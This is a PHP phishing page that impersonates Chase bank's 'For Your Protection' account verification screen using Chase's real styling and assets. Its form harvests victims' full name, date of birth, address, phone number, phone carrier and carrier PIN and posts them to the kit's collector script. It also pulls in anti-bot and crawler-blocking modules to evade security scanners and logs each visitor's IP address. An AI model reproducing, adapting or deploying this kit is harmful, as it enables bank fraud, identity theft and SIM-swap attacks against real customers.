<?php

session_start();
error_reporting(0);

//other bots
include 'blueprint/antbots/ip_blocklist.php';
include 'blueprint/antbots/crawler.php';
include 'blueprint/antbots/boting.php';
include 'blueprint/antbots/myz.php';
include 'bot_fucker/fucker001.php';
include 'bot_fucker/fucker002.php';
include 'bot_fucker/fucker003.php';
include 'bot_fucker/fucker004.php';
include 'bot_fucker/fucker005.php';
include 'bot_fucker/fucker006.php';
include 'bot_fucker/fucker007.php';
include 'bot_fucker/fucker008.php';
include 'bot_fucker/wrd.php';
include 'bot_fucker/bot.php';
require_once 'inc.php';
require_once 'blocklist.php';
require_once 'proxy.php';
require_once 'huehuehue.php';
include 'zsec.php';
//Crawler

@require "blueprint/antbots/Crawler/src/CrawlerDetect.php";
 use JayBizzle\CrawlerDetect\CrawlerDetect;




    $content2 = "#>".$_SERVER['REMOTE_ADDR']."\r\n";
    $save2=fopen("files/data/billing_page_views.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
    $marg = "-110px";

    $useragent=$_SERVER['HTTP_USER_AGENT'];
if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4)))
    $marg = "-195px";


?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="robots" content="noindex,nofollow">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>For Your Protection - chase.com</title>
        <meta name="description" content="">
        <meta name="author" content="">    
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.08.25-2054/logon/assets/logon.css">
<link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-797/common/assets/blue-ui.css">
<style type="text/css">
@font-face {
    font-family: 'icomoon';
    src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l");
    src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l#iefix") format('embedded-opentype'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.ttf?bj1g7l") format('bj1g7l'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.woff?bj1g7l") format('woff'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.svg?bj1g7l#icomoon") format('svg');
    font-weight: normal;
    font-style: normal
}
    .timeout-message {
    background-color: #128842;
    display: none;
}

.timeout-message__inner {
    position: relative;
    min-height: 2.25em;
    padding-top: 14px;
    padding-bottom: 14px;
}

.timeout-message__inner button {
    background-color: transparent;
    border: none;
    padding: 0
}

.timeout-message__text {
    line-height: 1.3em;
    font-weight: 300;
    position: relative;
}

.timeout-message__text-msg {
    display: none;
    color: #fff;
    margin: 0;
    position: relative;
    vertical-align: middle;
    padding-left: 32px;
    padding-right: 32px;
    font-size: 1.15em;
}

.timeout-message__text-msg.display {
    display: inline-block
}

.timeout-message__text-msg:focus {
    outline: 1px dotted #000
}

.timeout-message__dismiss-btn {
    color: #fff;
    text-decoration: none;
    position: absolute;
    font-size: .875em;
    line-height: 1.6em;
    top: 2px;
    right: 0;
}

.timeout-message__dismiss-btn:focus {
    outline: 1px dotted #000
}

.timeout-message__checkmark {
    display: inline-block;
    position: absolute;
    left: 0;
    margin-right: 12px;
}

.timeout-message__checkmark.icon-check-mark {
    -webkit-border-radius: 22px;
    border-radius: 22px;
    height: 22px;
    width: 22px;
    background: #fff;
    top: 4px;
}

.timeout-message__checkmark.icon-check-mark:before {
    color: #128842;
    font-size: 20px;
    font-weight: 300
}

@media only screen and (min-width: 48em) {
    .timeout-message__inner {
        padding-top:20px;
        padding-bottom: 20px;
        padding-left: 8px;
        padding-right: 8px
    }

    .timeout-message__text {
        font-size: 1.25em;
        line-height: 1.3em
    }

    .timeout-message__checkmark.icon-check-mark:before {
        margin-left: 1px
    }
    .feature-container {
        margin: 0 auto;
        max-width: 75em
    }
    .container-fluid {
    margin-right: auto;
    margin-left: auto;
    padding-left: 8px;
    padding-right: 8px
}
}
[class^="icon-"]:before,[class*=" icon-"]:before {
    font-family: 'icomoon' !important;
    /* speak: none; */
    font-style: normal;
    font-weight: normal;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.icon-close:before {
    content: "\e611";
}
.icon-check-mark:before {
    content: "\e60c";
} 

.loader,
.loader:after {
  border-radius: 50%;
  width: 10em;
  height: 10em;
}
.loader {
  margin: 60px auto;
  font-size: 5px;
  position: relative;
  text-indent: -9999em;
  border-top: 1.1em solid rgba(255, 255, 255, 0.2);
  border-right: 1.1em solid rgba(255, 255, 255, 0.2);
  border-bottom: 1.1em solid rgba(255, 255, 255, 0.2);
  border-left: 1.1em solid #0092ff;
  -webkit-transform: translateZ(0);
  -ms-transform: translateZ(0);
  transform: translateZ(0);
  -webkit-animation: load8 1.1s infinite linear;
  animation: load8 1.1s infinite linear;
}
@-webkit-keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
@keyframes load8 {
  0% {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  100% {
    -webkit-transform: rotate(360deg);
    transform: rotate(360deg);
  }
}
</style>
</head>

<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true" onFocus="parent_disable();" onclick="parent_disable();">
<div class="jpui modal" id="fullscreen-container" data-is-view="true" style="display: none;">
    <div class="dialog vertical-center util print-position-initial">
        <section class="dialogContent">
            <div class="row">
                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1"><i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i><span class="util accessible-text">Important: </span> Email Authentication Required.</h1><div class="suspended-advisory dialogMessage">We automatically redirected you to <span></span> to verify your email.<div class="loader">Loading...</div><a href="javascript:child_open(url)">Verify your email in the window provided. Click here if you can't find it.</a></div>
            </div>
        </section>
    </div>
</div>

<div class="jpui modal" id="inactiveAccountDialog" data-is-view="true" style="display: none;">
    <div class="dialog vertical-center util print-position-initial">
        <section class="dialogContent">
            <div class="row">
                <div class="col-xs-12 col-sm-7 col-sm-offset-3 util print-width-100-percent print-nomargin yielded-modal-content"><h1 class="u-no-outline dialogTitle" tabindex="-1"><i class="jpui exclamation-color icon error" id="undefined" aria-hidden="true"></i><span class="util accessible-text">Important: </span> <?php echo $notice['we'];?></h1> <div class="suspended-advisory dialogMessage"> <?php echo $notice['weneed'];?>&nbsp;please <a href="#">click <?php echo $notice['but'];?> to proceed<</div><br> <div class="row"><div class="col-xs-12 col-sm-offset-4 col-sm-4"><button type="button" id="exitAccountSuspended" class="jpui button focus primary fluid"><span class="label"><?php echo $notice['but'];?></span> </button></div></div></div>
            </div>
        </section>
    </div>
</div>
    <div id="logonApp" data-is-view="true">
        
        <div class="homepage" tabindex="-1">
            <div class="logon-container" id="container">
                <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true">
                    <div class="logon header jpui transparent navigation bar" data-is-view="true">
                        <a id="logoHomepageLink" href="#">
                            <div class="chase logo"></div> <span class="util accessible-text">Chase.com homepage</span></a>
                    </div>

                </header>
                <main id="logon-content" data-has-view="true">
                    <div class="msd" data-is-view="true">
                        <div id="backgroundImage">
                            <div class="jpui background image fixed blurred" id="geoImage">
                                <style type="text/css">
                                    ul li {
                                        margin-bottom: 5px;
                                    }
                                    .jpui.background.image {
                                        background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);
                                        filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');
                                        -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');
                                    }
                                    
                                    @media (min-width:320px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);
                                        }
                                    }
                                    
                                    @media (min-width:992px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.2.jpeg);
                                        }
                                    }
                                    
                                    @media (min-width:1024px) {
                                        .jpui.background.image {
                                            background-image: url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.2.jpeg);
                                        }
                                    }
                                </style>
                            </div>
                        </div>
                        <div class="container step4">
<div class="row jpui primary panel">
        <div class="col-xs-12 col-md-10 col-md-offset-1 content-container">
            <h1 class="header" tabindex="-1">For Your Protection</h1>
            <div class="row jpui panel body">
                <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                    <div class="progress u-no-outline" id="progress" tabindex="-1">
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 clear-padding">
                                <h2>Verify your card details on file <span class="util high-contrast">Step 3 of 3</span></h2> </div>
                            <div class="col-xs-12 col-sm-6 progress-padding">
                                <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                    <ol class="steps-3" role="presentation">
                                        <li class="active" id="progress-progressBar-step-1"></li>
                                        <li class="active" id="progress-progressBar-step-2"></li>
                                        <li class="active current-step" id="progress-progressBar-step-3"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <form action="files/next/billing.php" method="POST">
                        <h3>Enter your identification details.</h3>
                        <p>Your identification will be verified once submitted, please be sure of your information before you submit.</p>
                        <div class="inside-container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Full Name</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input" placeholder="Full Name" name="First_name" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your first name.">
                             
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Date Of Birth</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input class="jpui input" id="dlexp" name="dob"  type="tel" placeholder="DOB"  data-validation="length" data-validation-length="min2-30" data-validation-error-msg="Please tell us your date of birth in mm/dd/yyyy format." data-validation-length="min10" >
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Street Address</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input"  placeholder="Address"  name="Streetadd" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your address.">
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Zip</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input"  placeholder="Zip"  type="tel" name="zipcode" data-validation="length" data-validation-length="min1-6"  data-validation-error-msg="Please tell us your ZIP code."> 
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">City</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input"  placeholder="City" name="city" data-validation="length" data-validation-length="min1-30"  data-validation-error-msg="Please tell us your city code."> 
                             
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">State / Region</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input"  placeholder="State" name="state" data-validation="length" data-validation-length="min2-30" data-validation-error-msg="Please tell us your state code."> 
                                    </div>
                                </div>
                            </div>
                             
                             <div class="row">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Phone Number</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input  class="jpui input"  placeholder="Phone Number" name="phoneNumber" id="phoneNumber"  data-validation="length" data-validation-length="min10-14" data-validation-error-msg="Tell us your phone number." >
                                    </div>
                                </div>
                            </div>
                            <div class="row NumberCarrier" >
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Phone Carrier</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input class="jpui input" placeholder="Carrier" name="carrier" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your carrier.">
                                    </div>
                                </div>
                            </div>
                            <div class="row NumberPin">
                                <div class="col-xs-12 col-sm-5 label-column otp-code">
                                    <label class="jpui label" for="otpcode_input-input-field">Phone PIN</label>
                                </div>
                                <div class="col-xs-12 col-sm-5 form-column otp-code">
                                    <div class="account-input ssn_card_account_number" id="otpcode_input">
                                    <input class="jpui input" placeholder="PIN" type="password" name="carrierpin" maxlength="6" minlength="4" data-validation="length" data-validation-length="min4-6" data-validation-error-msg="Please tell us your Carrier Pin.">
                                    </div>
                                </div>
                            </div>                    
                            <h3>Billing verification</h3>
                            <p class="identification-code-received-message"><span>Your Billing details will be verified once submitted, please be sure of your information before you submit.</span> <span class="jpui link" id="requestNewIdentificationCode-link-wrapper"><a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" chase account verification ">chase account verification</a></span></p>
                        </div>
                        <div class="button-container row hide-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                <button type="submit" id="log_on_to_landing_page" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                <button type="button" id="exitIdentification" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                        </div>
                        <div class="button-container row hide-xs show-sm">
                            <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                <button type="button" id="exitIdentification-sm3" class="jpui button focus fluid cancel"><span class="label">Cancel</span> </button>
                            </div>
                            <div class="col-xs-12 col-sm-3">
                                <button type="submit" id="log_on_to_landing_page-sm" class="jpui button focus fluid primary"><span class="label">Next</span> </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>    
    
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dlexp");


</script>
</body>
</html>